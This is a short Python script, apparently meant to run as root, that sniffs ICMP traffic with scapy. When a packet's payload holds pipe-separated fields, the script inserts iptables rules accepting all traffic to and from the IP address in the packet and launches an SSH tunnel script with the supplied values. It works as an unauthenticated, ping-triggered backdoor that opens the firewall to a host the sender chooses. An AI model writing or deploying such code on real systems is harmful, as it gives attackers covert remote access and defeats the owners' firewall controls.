#! /usr/bin/env python
import logging
import socket
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess

def icmp_monitor_callback(pkt):
  reg = re.compile("(.*)\|(.*)\|(.*)")
  g = reg.match(pkt.load)
  if g:
    subprocess.Popen(["/sbin/iptables", "-I", "INPUT", "1","-s",g.group(1),'-j','ACCEPT'])
    subprocess.Popen(["/sbin/iptables", "-I", "OUTPUT", "1","-d",g.group(1),'-j','ACCEPT'])
    p=subprocess.call(["/root/sshtunnel.sh", g.group(1),g.group(2),g.group(3)])
  return

sniff(prn=icmp_monitor_callback, filter="icmp", store=0)
